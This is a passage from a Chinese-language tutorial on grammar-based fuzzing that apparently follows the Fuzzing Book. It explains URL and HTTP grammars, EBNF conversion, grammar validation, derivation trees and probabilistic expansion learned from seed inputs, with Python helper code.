[\"&lt;digit&gt;\", \"&lt;digit&gt;&lt;digit&gt;\"],\n    \"&lt;digit&gt;\":\n        [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"],\n    \"&lt;userinfo&gt;\":  # Just one\n        [\"user:password\"],\n    \"&lt;path&gt;\":  # Just a few\n        [\"\", \"/\", \"/&lt;id&gt;\"],\n    \"&lt;id&gt;\":  # Just a few\n        [\"abc\", \"def\", \"x&lt;digit&gt;&lt;digit&gt;\"],\n    \"&lt;query&gt;\":\n        [\"\", \"?&lt;params&gt;\"],\n    \"&lt;params&gt;\":\n        [\"&lt;param&gt;\", \"&lt;param&gt;&amp;&lt;params&gt;\"],\n    \"&lt;param&gt;\":  # Just a few\n        [\"&lt;id&gt;=&lt;id&gt;\", \"&lt;id&gt;=&lt;nat&gt;\"],\n}\n\n或者类似HTTP协议的（但是这个不是为上述Fuzz准备的，只是拿来做个参考）：\n{\n\t\"&lt;A&gt;\": [[\"&lt;START_LINE&gt;\", \"\\r\\n\", \"&lt;HEADERS&gt;\", \"&lt;BODY&gt;\", \"\\r\\n\\r\\n\"]],\n\t\n\t\"&lt;START_LINE&gt;\": [[\"&lt;METHOD&gt;\", \" \", \"&lt;URI&gt;\", \" \", \"&lt;VERSION&gt;\"]],\n\t\n\t\"&lt;METHOD&gt;\": [[\"GET\"], [\"HEAD\"], [\"POST\"], [\"PUT\"], [\"DELETE\"], [\"CONNECT\"], [\"OPTIONS\"], [\"TRACE\"], [\"PATCH\"], [\"ACL\"], [\"BASELINE-CONTROL\"], [\"BIND\"], [\"CHECKIN\"], [\"CHECKOUT\"], [\"COPY\"], [\"LABEL\"], [\"LINK\"], [\"LOCK\"], [\"MERGE\"], [\"MKACTIVITY\"], [\"MKCALENDAR\"], [\"MKCOL\"], [\"MKREDIRECTREF\"], [\"MKWORKSPACE\"], [\"MOVE\"], [\"ORDERPATCH\"], [\"PRI\"], [\"PROPFIND\"], [\"PROPPATCH\"], [\"REBIND\"], [\"REPORT\"], [\"SEARCH\"], [\"UNBIND\"], [\"UNCHECKOUT\"], [\"UNLINK\"], [\"UNLOCK\"], [\"UPDATE\"], [\"UPDATEREDIRECTREF\"], [\"VERSION-CONTROL\"]],\n\t\n\t\"&lt;URI&gt;\": [[\"&lt;SCHEME&gt;\" , \":\", \"&lt;HIER&gt;\", \"&lt;QUERY&gt;\", \"&lt;FRAGMENT&gt;\"]],\n\t\n\t\"&lt;SCHEME&gt;\": [[\"http\"], [\"https\"], [\"shttp\"], [\"dav\"], [\"about\"], [\"attachment\"], [\"cid\"], [\"data\"], [\"file\"], [\"ftp\"], [\"ssh\"], [\"sip\"]],\n\t\n\t\"&lt;HIER&gt;\": [[\"//\", \"&lt;AUTHORITY&gt;\", \"&lt;PATH&gt;\"]],\n\t\n\t\"&lt;AUTHORITY&gt;\": [[\"&lt;USERINFO&gt;\", \"&lt;HOST&gt;\"]],\n\n\t\"&lt;PATH&gt;\": [[\"/\", \"&lt;DIR&gt;\"]],\n\n\t\"&lt;DIR&gt;\": [[], [\"&lt;CHAR&gt;\", \"/\", \"&lt;DIR&gt;\"]],\n\t\n\t\"&lt;USERINFO&gt;\": [[], [\"&lt;CHAR&gt;\", \":\", \"&lt;CHAR&gt;\", \"@\"]],\n\t\n\t\"&lt;HOST&gt;\": [[\"127.0.0.1:8080\"]],\n\t\n\t\"&lt;QUERY&gt;\": [[], [\"?\", \"&lt;CHAR&gt;\" , \"=\", \"&lt;CHAR&gt;\"]],\n\t\n\t\"&lt;FRAGMENT&gt;\": [[], [\"#\", \"&lt;CHAR&gt;\"]],\n\n\t\"&lt;VERSION&gt;\": [[\"HTTP/0.9\"], [\"HTTP/1.0\"], [\"HTTP/1.1\"], [\"HTTP/2.0\"], [\"HTTP/3.0\"]],\n\t\n\t\"&lt;HEADERS&gt;\": [[], [\"&lt;HEADER&gt;\", \"\\r\\n\", \"&lt;HEADERS&gt;\"]],\n\t\n\t\"&lt;HEADER&gt;\": [[\"&lt;HEADER_FIELD&gt;\", \": \", \"&lt;ANY&gt;\"]],\n\t\n\t\"&lt;HEADER_FIELD&gt;\": [[\"A-IM\"], [\"Accept\"], [\"Accept-Charset\"], [\"Accept-Datetime\"], [\"Accept-Encoding\"], [\"Accept-Language\"], [\"Access-Control-Request-Method\"], [\"Access-Control-Request-Headers\"], [\"Authorization\"], [\"Cache-Control\"], [\"Connection\"], [\"Content-Encoding\"], [\"Content-Length\"], [\"Content-MD5\"], [\"Content-Type\"], [\"Cookie\"], [\"Date\"], [\"Expect\"], [\"Forwarded\"], [\"From\"], [\"Host\"], [\"HTTP2-Settings\"], [\"If-Match\"], [\"If-Modified-Since\"], [\"If-None-Match\"], [\"If-Range\"], [\"If-Unmodified-Since\"], [\"Max-Forwards\"], [\"Origin\"], [\"Pragma\"], [\"Proxy-Authorization\"], [\"Range\"], [\"Referer\"], [\"TE\"], [\"Trailer\"], [\"Transfer-Encoding\"], [\"User-Agent\"], [\"Upgrade\"], [\"Via\"], [\"Warning\"]],\n\t\n\t\"&lt;BODY&gt;\": [[], [\"&lt;CHAR&gt;\"]],\n\t\n\t\"&lt;ANY&gt;\": [[], [\"&lt;DATE&gt;\"], [\"&lt;CHAR&gt;\"], [\"&lt;HOST&gt;\"], [\"&lt;URI&gt;\"]],\n\t\n\t\"&lt;DATE&gt;\": [[\"Sat, 29 Oct 1994 19:43:31 GMT\"]],\n\t\n\t\"&lt;CHAR&gt;\": [[\"0\"], [\"1\"], [\"2\"], [\"3\"], [\"4\"], [\"5\"], [\"6\"], [\"7\"], [\"8\"], [\"9\"], [\"a\"], [\"b\"], [\"c\"], [\"d\"], [\"e\"], [\"f\"], [\"g\"], [\"h\"], [\"i\"], [\"j\"], [\"k\"], [\"l\"], [\"m\"], [\"n\"], [\"o\"], [\"p\"], [\"q\"], [\"r\"], [\"s\"], [\"t\"], [\"u\"], [\"v\"], [\"w\"], [\"x\"], [\"y\"], [\"z\"], [\"A\"], [\"B\"], [\"C\"], [\"D\"], [\"E\"], [\"F\"], [\"G\"], [\"H\"], [\"I\"], [\"J\"], [\"K\"], [\"L\"], [\"M\"], [\"N\"], [\"O\"], [\"P\"], [\"Q\"], [\"R\"], [\"S\"], [\"T\"], [\"U\"], [\"V\"], [\"W\"], [\"X\"], [\"Y\"], [\"Z\"]]\n}\n\n到此，我们理解了Grammar对于Fuzzing的重要性，一个杰出的Grammar能够有效的生成大量合法输入，不过这只是从输入组成（句法）来看，这毕竟是一个庞大的范围，虽然有时候满足程序的输入格式，但是未必真的对Fuzzing起作用，这种情况非常常见。再一次以编译器为例子，你的程序在满足语言语法的同时更应该具备正确的语义。但是语义很难再以Grammar的形式表达。以URL生成Grammar为例，简单通过Grammar很难定义端口的范围。面对这样的问题，最简单的解决办法其实就是在Fuzz里面而不是在Grammar里面进行限制。以URL Grammar为例，通过Grammar生成的URL在真正的被作为Input给予目标之前，应该在Fuzz系统里面经过URL“合法性”判断，这里的判断可以由作者根据自己的需求来进行限制。\nGrammar Toolbox​  在Fuzzing项目中对于Grammar的需求并不是一成不变的，因此Grammar的一大需求就是具备可扩展性。以一个简单的Gramar为例：\nsimple_nonterminal_grammar: Grammar = {\n    \"&lt;start&gt;\": [\"&lt;nonterminal&gt;\"],\n    \"&lt;nonterminal&gt;\": [\"&lt;left-angle&gt;&lt;identifier&gt;&lt;right-angle&gt;\"],\n    \"&lt;left-angle&gt;\": [\"&lt;\"],\n    \"&lt;right-angle&gt;\": [\"&gt;\"],\n    \"&lt;identifier&gt;\": [\"id\"]  # for now\n}\n\n有时候我们希望拓展其功能，但是不希望原来的Grammar受到影响（类比编程中的继承）,就是一个很简单的如下操作。\nnonterminal_grammar = copy.deepcopy(simple_nonterminal_grammar)\nnonterminal_grammar[\"&lt;identifier&gt;\"] = [\"&lt;idchar&gt;\", \"&lt;identifier&gt;&lt;idchar&gt;\"]\nnonterminal_grammar[\"&lt;idchar&gt;\"] = ['a', 'b', 'c', 'd']  # for now\n\n总结为一个函数如下，非常简单就不多解释：\ndef set_opts(grammar: Grammar, symbol: str, expansion: Expansion, \n             opts: Option = {}) -&gt; None:\n    \"\"\"Set the options of the given expansion of grammar[symbol] to opts\"\"\"\n    expansions = grammar[symbol]\n    for i, exp in enumerate(expansions):\n        if exp_string(exp) != exp_string(expansion):\n            continue\n\n        new_opts = exp_opts(exp)\n        if opts == {} or new_opts == {}:\n            new_opts = opts\n        else:\n            for key in opts:\n                new_opts[key] = opts[key]\n\n        if new_opts == {}:\n            grammar[symbol][i] = exp_string(exp)\n        else:\n            grammar[symbol][i] = (exp_string(exp), new_opts)\n\n        return\n\n    raise KeyError(\n        \"no expansion \" +\n        repr(symbol) +\n        \" -&gt; \" +\n        repr(\n            exp_string(expansion)))\n\n同时，在写Fuzz的时候肯定不希望不断地写大量的符号和值的对应，因此我们需要一些语法来帮助，这里提供了ENBF的解析方法：\n# 解析 ebnf 语法\ndef new_symbol(grammar: Grammar, symbol_name: str = \"&lt;symbol&gt;\") -&gt; str:\n    \"\"\"Return a new symbol for `grammar` based on `symbol_name`\"\"\"\n    if symbol_name not in grammar:\n        return symbol_name\n\n    count = 1\n    while True:\n        tentative_symbol_name = symbol_name[:-1] + \"-\" + repr(count) + \"&gt;\"\n        if tentative_symbol_name not in grammar:\n            return tentative_symbol_name\n        count += 1\n\n# 提取表达式中符合EBNF语法的部分，? , * , + , ()\ndef parenthesized_expressions(expansion: Expansion) -&gt; List[str]:\n    RE_PARENTHESIZED_EXPR = re.compile(r'\\([^()]*\\)[?+*]')\n    # In later chapters, we allow expansions to be tuples,\n    # with the expansion being the first element\n    if isinstance(expansion, tuple):\n        expansion = expansion[0]\n\n    return re.findall(RE_PARENTHESIZED_EXPR, expansion)\n\n# 对Grammar中的EBNF语法括号进行解析\ndef convert_ebnf_parentheses(ebnf_grammar: Grammar) -&gt; Grammar:\n    \"\"\"Convert a grammar in extended BNF to BNF\"\"\"\n    grammar = extend_grammar(ebnf_grammar)\n    for nonterminal in ebnf_grammar:\n        expansions = ebnf_grammar[nonterminal]\n\n        for i in range(len(expansions)):\n            expansion = expansions[i]\n            if not isinstance(expansion, str):\n                expansion = expansion[0]\n\n            while True:\n                parenthesized_exprs = parenthesized_expressions(expansion)\n                if len(parenthesized_exprs) == 0:\n                    break\n\n                for expr in parenthesized_exprs:\n                    operator = expr[-1:]\n                    contents = expr[1:-2]\n\n                    new_sym = new_symbol(grammar)\n\n                    exp = grammar[nonterminal][i]\n                    opts = None\n                    if isinstance(exp, tuple):\n                        (exp, opts) = exp\n                    assert isinstance(exp, str)\n\n                    expansion = exp.replace(expr, new_sym + operator, 1)\n                    if opts:\n                        grammar[nonterminal][i] = (expansion, opts)\n                    else:\n                        grammar[nonterminal][i] = expansion\n\n                    grammar[new_sym] = [contents]\n\n    return grammar\n\n# ENBF符号扩展\ndef extended_nonterminals(expansion: Expansion) -&gt; List[str]:\n    RE_EXTENDED_NONTERMINAL = re.compile(r'(&lt;[^&lt;&gt; ]*&gt;[?+*])')\n    # In later chapters, we allow expansions to be tuples,\n    # with the expansion being the first element\n    if isinstance(expansion, tuple):\n        expansion = expansion[0]\n\n    return re.findall(RE_EXTENDED_NONTERMINAL, expansion)\n\n# ENBF符号扩展\ndef convert_ebnf_operators(ebnf_grammar: Grammar) -&gt; Grammar:\n    \"\"\"Convert a grammar in extended BNF to BNF\"\"\"\n    grammar = extend_grammar(ebnf_grammar)\n    for nonterminal in ebnf_grammar:\n        expansions = ebnf_grammar[nonterminal]\n\n        for i in range(len(expansions)):\n            expansion = expansions[i]\n            extended_symbols = extended_nonterminals(expansion)\n\n            for extended_symbol in extended_symbols:\n                operator = extended_symbol[-1:]\n                original_symbol = extended_symbol[:-1]\n                assert original_symbol in ebnf_grammar, \\\n                    f\"{original_symbol} is not defined in grammar\"\n\n                new_sym = new_symbol(grammar, original_symbol)\n\n                exp = grammar[nonterminal][i]\n                opts = None\n                if isinstance(exp, tuple):\n                    (exp, opts) = exp\n                assert isinstance(exp, str)\n\n                new_exp = exp.replace(extended_symbol, new_sym, 1)\n                if opts:\n                    grammar[nonterminal][i] = (new_exp, opts)\n                else:\n                    grammar[nonterminal][i] = new_exp\n\n                if operator == '?':\n                    grammar[new_sym] = [\"\", original_symbol]\n                elif operator == '*':\n                    grammar[new_sym] = [\"\", original_symbol + new_sym]\n                elif operator == '+':\n                    grammar[new_sym] = [\n                        original_symbol, original_symbol + new_sym]\n\n    return grammar\n\ndef convert_ebnf_grammar(ebnf_grammar: Grammar) -&gt; Grammar:\n    return convert_ebnf_operators(convert_ebnf_parentheses(ebnf_grammar))\n\n对于Grammar来言，我们必须要确定它的一个合法性，不然在使用中必然会遇到各种错误问题，因此语法检查是很必要的，就如同编译器的语法检查很重要一样：\n# 搜索Grammar中的定义的noterminal\ndef def_used_nonterminals(grammar: Grammar, start_symbol: \n                          str = START_SYMBOL) -&gt; Tuple[Optional[Set[str]], \n                                                       Optional[Set[str]]]:\n    \"\"\"Return a pair (`defined_nonterminals`, `used_nonterminals`) in `grammar`.\n    In case of error, return (`None`, `None`).\"\"\"\n\n    defined_nonterminals = set()\n    used_nonterminals = {start_symbol}\n\n    for defined_nonterminal in grammar:\n        defined_nonterminals.add(defined_nonterminal)\n        expansions = grammar[defined_nonterminal]\n        if not isinstance(expansions, list):\n            print(repr(defined_nonterminal) + \": expansion is not a list\",\n                  file=sys.stderr)\n            return None, None\n\n        if len(expansions) == 0:\n            print(repr(defined_nonterminal) + \": expansion list empty\",\n                  file=sys.stderr)\n            return None, None\n\n        for expansion in expansions:\n            if isinstance(expansion, tuple):\n                expansion = expansion[0]\n            if not isinstance(expansion, str):\n                print(repr(defined_nonterminal) + \": \"\n                      + repr(expansion) + \": not a string\",\n                      file=sys.stderr)\n                return None, None\n\n            for used_nonterminal in nonterminals(expansion):\n                used_nonterminals.add(used_nonterminal)\n\n    return defined_nonterminals, used_nonterminals\n\ndef reachable_nonterminals(grammar: Grammar,\n                           start_symbol: str = START_SYMBOL) -&gt; Set[str]:\n    reachable = set()\n\n    def _find_reachable_nonterminals(grammar, symbol):\n        nonlocal reachable\n        reachable.add(symbol)\n        for expansion in grammar.get(symbol, []):\n            for nonterminal in nonterminals(expansion):\n                if nonterminal not in reachable:\n                    _find_reachable_nonterminals(grammar, nonterminal)\n\n    _find_reachable_nonterminals(grammar, start_symbol)\n    return reachable\n\ndef unreachable_nonterminals(grammar: Grammar,\n                             start_symbol=START_SYMBOL) -&gt; Set[str]:\n    return grammar.keys() - reachable_nonterminals(grammar, start_symbol)\n\ndef opts_used(grammar: Grammar) -&gt; Set[str]:\n    used_opts = set()\n    for symbol in grammar:\n        for expansion in grammar[symbol]:\n            used_opts |= set(exp_opts(expansion).keys())\n    return used_opts\n\n# Grammar的合法性判断，类似于编译器里面的语法检查\ndef is_valid_grammar(grammar: Grammar,\n                     start_symbol: str = START_SYMBOL, \n                     supported_opts: Set[str] = set()) -&gt; bool:\n    \"\"\"Check if the given `grammar` is valid.\n       `start_symbol`: optional start symbol (default: `&lt;start&gt;`)\n       `supported_opts`: options supported (default: none)\"\"\"\n\n    defined_nonterminals, used_nonterminals = \\\n        def_used_nonterminals(grammar, start_symbol)\n    if defined_nonterminals is None or used_nonterminals is None:\n        return False\n\n    # Do not complain about '&lt;start&gt;' being not used,\n    # even if start_symbol is different\n    if START_SYMBOL in grammar:\n        used_nonterminals.add(START_SYMBOL)\n\n    for unused_nonterminal in defined_nonterminals - used_nonterminals:\n        print(repr(unused_nonterminal) + \": defined, but not used\",\n              file=sys.stderr)\n    for undefined_nonterminal in used_nonterminals - defined_nonterminals:\n        print(repr(undefined_nonterminal) + \": used, but not defined\",\n              file=sys.stderr)\n\n    # Symbols must be reachable either from &lt;start&gt; or given start symbol\n    unreachable = unreachable_nonterminals(grammar, start_symbol)\n    msg_start_symbol = start_symbol\n\n    if START_SYMBOL in grammar:\n        unreachable = unreachable - \\\n            reachable_nonterminals(grammar, START_SYMBOL)\n        if start_symbol != START_SYMBOL:\n            msg_start_symbol += \" or \" + START_SYMBOL\n\n    for unreachable_nonterminal in unreachable:\n        print(repr(unreachable_nonterminal) + \": unreachable from \" + msg_start_symbol,\n              file=sys.stderr)\n\n    used_but_not_supported_opts = set()\n    if len(supported_opts) &gt; 0:\n        used_but_not_supported_opts = opts_used(\n            grammar).difference(supported_opts)\n        for opt in used_but_not_supported_opts:\n            print(\n                \"warning: option \" +\n                repr(opt) +\n                \" is not supported\",\n                file=sys.stderr)\n\n    return used_nonterminals == defined_nonterminals and len(unreachable) == 0\n\n以上列举的是常用的Tools，在Fuzz的编写过程中，要根据实际问题针对性的编写各式各样的工具。\n高效Grammars Fuzz​  前面提供的simple_grammar_fuzzer其实存在大量的问题，比如性能低下，对于符号的解析次数受限，容易引起报错等，因此需要更加高明的算法。这里选择的是派生树，因为树形结构易于追踪而且易于添加和删除其中分支。关于Fuzz的编写其实就是不断的对派生树进行分析和对子节点的不断扩展。\n派生树算法​  从上述的简单算法可以看出，整个的Grammar Fuzz的核心其实就是通过大量的符号扩展形成对应的数据结构，那么用来存储或者拓展符号的数据结构其实尤为重要。派生树的树状结构其实完美的符合了我们的要求，树形结构自上而下的扩展正好和符号的扩展相对应。而且派生树使得我们可以掌控整个扩展过程的状态，比如那些节点已经被扩展，或者某个节点是否需要扩展等，同时，在扩展过程中增加新节点的速度远超把一个符号替换为一个值的过程，因此使用这种数据结构也带来了一定的性能增益。\n​  让我们以下面的Grammar为例子：\n# URL Grammar\nURL_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\":\n        [\"&lt;url&gt;\"],\n    \"&lt;url&gt;\":\n        [\"&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;\"],\n    \"&lt;scheme&gt;\":\n        [\"http\", \"https\", \"ftp\", \"ftps\"],\n    \"&lt;authority&gt;\":\n        [\"&lt;host&gt;\", \"&lt;host&gt;:&lt;port&gt;\", \"&lt;userinfo&gt;@&lt;host&gt;\", \"&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;\"],\n    \"&lt;host&gt;\":  # 大部分情况下其实可以指定一个URL\n        [\"cispa.saarland\", \"www.google.com\", \"fuzzingbook.com\"],\n    \"&lt;port&gt;\":\n        [\"80\", \"8080\", \"&lt;nat&gt;\"],\n    \"&lt;nat&gt;\":\n        [\"&lt;digit&gt;\", \"&lt;digit&gt;&lt;digit&gt;\"],\n    \"&lt;digit&gt;\":\n        [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"],\n    \"&lt;userinfo&gt;\":  # Just one\n        [\"user:password\"],\n    \"&lt;path&gt;\":  # Just a few\n        [\"\", \"/\", \"/&lt;id&gt;\"],\n    \"&lt;id&gt;\":  # Just a few\n        [\"abc\", \"def\", \"x&lt;digit&gt;&lt;digit&gt;\"],\n    \"&lt;query&gt;\":\n        [\"\", \"?&lt;params&gt;\"],\n    \"&lt;params&gt;\":\n        [\"&lt;param&gt;\", \"&lt;param&gt;&amp;&lt;params&gt;\"],\n    \"&lt;param&gt;\":  # Just a few\n        [\"&lt;id&gt;=&lt;id&gt;\", \"&lt;id&gt;=&lt;nat&gt;\"],\n}\n\n以派生树算法来看，首先以&lt;start&gt;为初始节点，然后在Grammar中发现其存在对应的表达，所以就会选择&lt;url&gt;作为它的子节点，循环往复知道一个节点不再出现对应的子节点，然后整个的树形结构完成解析，输出对应的结构化数据。\n​  对应的数据表示如下：\n(SYMBOL_NAME, CHILDREN)\nDerivationTree = Tuple[str, Optional[List[Any]]]\nderivation_tree: DerivationTree = (\"&lt;start&gt;\",\n                   [(\"&lt;expr&gt;\",\n                     [(\"&lt;expr&gt;\", None),\n                      (\" + \", []),\n                         (\"&lt;term&gt;\", None)]\n                     )])\n\nSYMBOL_NAME代表的就是符号，CHILDREN代表子节点，表示为具体的数据结构就是：DerivationTree = Tuple[str, Optional[List[Any]]]。其中CHILDREN主要有两种表示：\n\nNone代表当前节点可以继续向下扩展，其含义就是现在节点存在可扩展的符号。\n[]代表的就是没有子节点了\n\n整个算法都围绕上面的基本原理展开\ndef g_rammar_fuzzer():\n    f = GrammarFuzzer(URL_GRAMMAR)\n    f.fuzz()\n\nProbabilisticGrammarFuzzer​  有时候完全随机的进行表达式展开其实会白白浪费大量的时间和资源，因此可以对表达式附加概率值，这一块涉及到大量的概率学问题，有部分数据来源于世界的统计规律，比如下面给出的leaddigit符号对应的概率，这些就不在深入分析。\nPROBABILISTIC_EXPR_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\":\n        [\"&lt;expr&gt;\"],\n\n    \"&lt;expr&gt;\":\n        [(\"&lt;term&gt; + &lt;expr&gt;\", opts(prob=0.1)),\n         (\"&lt;term&gt; - &lt;expr&gt;\", opts(prob=0.2)),\n         \"&lt;term&gt;\"],\n\n    \"&lt;term&gt;\":\n        [(\"&lt;factor&gt; * &lt;term&gt;\", opts(prob=0.1)),\n         (\"&lt;factor&gt; / &lt;term&gt;\", opts(prob=0.1)),\n         \"&lt;factor&gt;\"\n         ],\n\n    \"&lt;factor&gt;\":\n        [\"+&lt;factor&gt;\", \"-&lt;factor&gt;\", \"(&lt;expr&gt;)\",\n            \"&lt;leadinteger&gt;\", \"&lt;leadinteger&gt;.&lt;integer&gt;\"],\n\n    \"&lt;leadinteger&gt;\":\n        [\"&lt;leaddigit&gt;&lt;integer&gt;\", \"&lt;leaddigit&gt;\"],\n\n    # Benford's law: frequency distribution of leading digits\n    \"&lt;leaddigit&gt;\":\n        [(\"1\", opts(prob=0.301)),\n         (\"2\", opts(prob=0.176)),\n         (\"3\", opts(prob=0.125)),\n         (\"4\", opts(prob=0.097)),\n         (\"5\", opts(prob=0.079)),\n         (\"6\", opts(prob=0.067)),\n         (\"7\", opts(prob=0.058)),\n         (\"8\", opts(prob=0.051)),\n         (\"9\", opts(prob=0.046)),\n         ],\n\n    # Remaining digits are equally distributed\n    \"&lt;integer&gt;\":\n        [\"&lt;digit&gt;&lt;integer&gt;\", \"&lt;digit&gt;\"],\n\n    \"&lt;digit&gt;\":\n        [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\"],\n}\n\n跟之前的Grammar有很大不同的地方在于，现在的Grammar可以通过增加注释的方式为列表中的值添加随机概率，使得作者可以通过逆向获取其它渠道得到的信息可以在Fuzz中获得利用。那现在问题就显而易见了，如何确定概率？\n​  当Fuzz的作者没办法直接给出一个符号对应的所有项具体的概率的时候，可以遵循的最直接的规则就是下面三个公式：\n\n\n\n大致含义也很好理解，就是a代表的是已知概率的项，而u代表的未知概率的项目，已知概率自然可以通过opts的方法给对应项附加概率，未知概率的项则按照概率平分的原则来赋予概率。之后自然是要在Fuzz里面引入概率，使得在生成种子的时候可以对符号解析的选择赋予权重，进而提高Fuzz效率。\n​  就Fuzz的具体实现而言，其实相比于上述的Grammar Fuzz只是增加了一个对于opts注释的访问，以便在随机解析的时候可以附加概率值权重。但是这样带来的优势是很明显的，甚至可以通过控制输入Fuzz目标指定的Func等。但是还有一种情况，我第一次解析Grammar symbol的时候希望它的概率为0.3，但是我第二次解析Grammar symbol的时候希望其概率为0.5，为了实现这一点其实可以利用上下文，在不同的上下文中复制希望赋予其不同概率的symbol，以IP Grammar为例子：\nIP_ADDRESS_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\": [\"&lt;address&gt;\"],\n    \"&lt;address&gt;\": [\"&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;.&lt;octet&gt;\"],\n    # [\"0\", \"1\", \"2\", ..., \"255\"]\n    \"&lt;octet&gt;\": decrange(0, 256) # 其实代表的就是0-256\n}\n\n为了使得每次解析&lt;octet&gt;的时候都使用不同的概率，可以对其扩展，形成下面的语法：\nIP_ADDRESS_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\": [\"&lt;address&gt;\"],\n    \"&lt;address&gt;\": [\"&lt;octet-1&gt;.&lt;octet-2&gt;.&lt;octet-3&gt;.&lt;octet-4&gt;\"],\n    # [\"0\", \"1\", \"2\", ..., \"255\"]\n    \"&lt;octet-1&gt;\": decrange(0, 256) # 其实代表的就是0-256\n    \"&lt;octet-2&gt;\": decrange(0, 256) # 其实代表的就是0-256\n    \"&lt;octet-3&gt;\": decrange(0, 256) # 其实代表的就是0-256\n    \"&lt;octet-4&gt;\": decrange(0, 256) # 其实代表的就是0-256\n}\n\n这样在进行解析的时候就完全可以对每次解析附加不同的概率。下面是帮助实现的函数：\ndef _duplicate_context(grammar: Grammar,\n                       orig_grammar: Grammar,\n                       symbol: str,\n                       expansion: Optional[Expansion],\n                       depth: Union[float, int],\n                       seen: Dict[str, str]) -&gt; None:\n    \"\"\"Helper function for `duplicate_context()`\"\"\"\n\n    for i in range(len(grammar[symbol])):\n        if expansion is None or grammar[symbol][i] == expansion:\n            new_expansion = \"\"\n            for (s, c) in expansion_to_children(grammar[symbol][i]):\n                if s in seen:                 # Duplicated already\n                    new_expansion += seen[s]\n                elif c == [] or depth == 0:   # Terminal symbol or end of recursion\n                    new_expansion += s\n                else:                         # Nonterminal symbol - duplicate\n                    # Add new symbol with copy of rule\n                    new_s = new_symbol(grammar, s)\n                    grammar[new_s] = copy.deepcopy(orig_grammar[s])\n\n                    # Duplicate its expansions recursively\n                    # {**seen, **{s: new_s}} is seen + {s: new_s}\n                    _duplicate_context(grammar, orig_grammar, new_s, expansion=None,\n                                       depth=depth - 1, seen={**seen, **{s: new_s}})\n                    new_expansion += new_s\n\n            grammar[symbol][i] = new_expansion\n\ndef duplicate_context(grammar: Grammar, \n                      symbol: str,\n                      expansion: Optional[Expansion] = None, \n                      depth: Union[float, int] = float('inf')):\n    \"\"\"Duplicate an expansion within a grammar.\n\n    In the given grammar, take the given expansion of the given `symbol`\n    (if `expansion` is omitted: all symbols), and replace it with a\n    new expansion referring to a duplicate of all originally referenced rules.\n\n    If `depth` is given, limit duplication to `depth` references\n    (default: unlimited)\n    \"\"\"\n    orig_grammar = extend_grammar(grammar)\n    _duplicate_context(grammar, orig_grammar, symbol,\n                       expansion, depth, seen={})\n\n    # After duplication, we may have unreachable rules; delete them\n    for nonterminal in unreachable_nonterminals(grammar):\n        del grammar[nonterminal]\n\n在完成上下文复制之后就可以通过类似下面的操作得到我们想要的结果：\nset_prob(probabilistic_ip_address_grammar, \"&lt;octet-1&gt;\", \"127\", 1.0)\nset_prob(probabilistic_ip_address_grammar, \"&lt;octet-2&gt;\", \"0\", 1.0)\n\n不过这就又引入一个问题，概率在赋予给symbol之后一成不变真的合适吗？在真实世界的Fuzz中随着我们对于目标的不断了解，或者一些其它情况比如长时间未出现想要的结果等，及时改变策略也是非常必要的，但是如果Fuzz可以智能的自己调节调整不同symbol的概率值的话，会减轻很多的负担并获得更好的软件测试效果。一个比较好的办法是让Fuzz通过最开始被给予Inputs种子来学习应该赋予某些symbol多大的一个概率值，这种方法在某些场景下非常有用：\n\n测试常用功能，因为很多软件测试更希望常用的功能确保安全，但是对于漏洞挖掘研究人员来说可能目标不在于此。\n测试不常用功能，通过规避Inputs中解析到的symbol，Fuzz就会更偏向于测试一些不常用的功能。\n专注于指定的Inputs，一些漏洞挖掘可能希望专注于已有的非常有价值的poc inputs，通过专注于这些inputs，Fuzz可以测试软件的一些薄弱环节从而达到很好的效果。\n\n​  理论已经存在，那么如何实现呢？第一步肯定是需要将已经存在的Inputs种子恢复成为派生树，然后对派生树种每个Symbol对应的值有多少来计算将来的概率值。\n\n如上图，假设我给与一个127.0.0.1的种子，那么被解析之后，0在&lt;octet&gt;中的概率值就会被限制为50%，127和1分别为25%，那么在Fuzz运行的时候相关的概率值就可以赋予给&lt;octet&gt;。那么如果测试一些不常用功能该怎么办呢？其实就是通过原来测常用功能的Inputs得到相关概率，然后进行概率翻转就行了，比如常用功能的Inputs概率如下：\n[('http', {'prob': 0.2222222222222222}),\n ('https', {'prob': 0.6666666666666666}),\n ('ftp', {'prob': 0.0}),\n ('ftps', {'prob': 0.1111111111111111})]\n\n那么经过翻转之后就是：\n[('http', {'prob': 0.1111111111111111}),\n ('https', {'prob': 0.0}),\n ('ftp', {'prob': 0.6666666666666666}),\n ('ftps', {'prob': 0.2222222222222222})]\n\n上述就是之前讲到的专注测试常用功能或者非常用功能的基本思路，从此处引出的另一个比较关键的是通过Inputs帮我们专注于目标的特定功能，它和测试常用功能的区别就是首先要找到一批特殊的Inputs，通过这些Inputs作为seeds就可以对语法解析的过程进行概率分析和限制，使得后续的变异可以一直有较高的目标命中率。\nGenerator With Pre or Post or order Func​  在某些Inputs在生成的时候，Fuzz作者可能希望对他们进行一些限制调整，获取其它的操作，这些都可以通过pre func完成。这类似于hook，那么对于func触发的时机一般就分为两种，在Inputs的生成之前或者是生成之后，在语法里面的表示就是：\nCHARGE_GRAMMAR: Grammar = {\n    \"&lt;start&gt;\": [\"Charge &lt;amount&gt; to my credit card &lt;credit-card-number&gt;\"],\n    \"&lt;amount&gt;\": [\"$&lt;float&gt;\"],\n    \"&lt;float&gt;\": [\"&lt;integer&gt;.&lt;digit&gt;&lt;digit&gt;\"],\n    \"&lt;integer&gt;\": [\"&lt;digit&gt;\", \"&lt;integer&gt;&lt;digit&gt;\"],\n    \"&lt;digit&gt;\": crange('0', '9'),\n\n    \"&lt;credit-card-number&gt;\": [\"&lt;digits&gt;\"],\n    \"&lt;digits&gt;\": [\"&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;&lt;digit-block&gt;\"],\n    \"&lt;digit-block&gt;\": [\"&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;&lt;digit&gt;\"],\n}\n\nCHARGE_GRAMMAR.update({\n    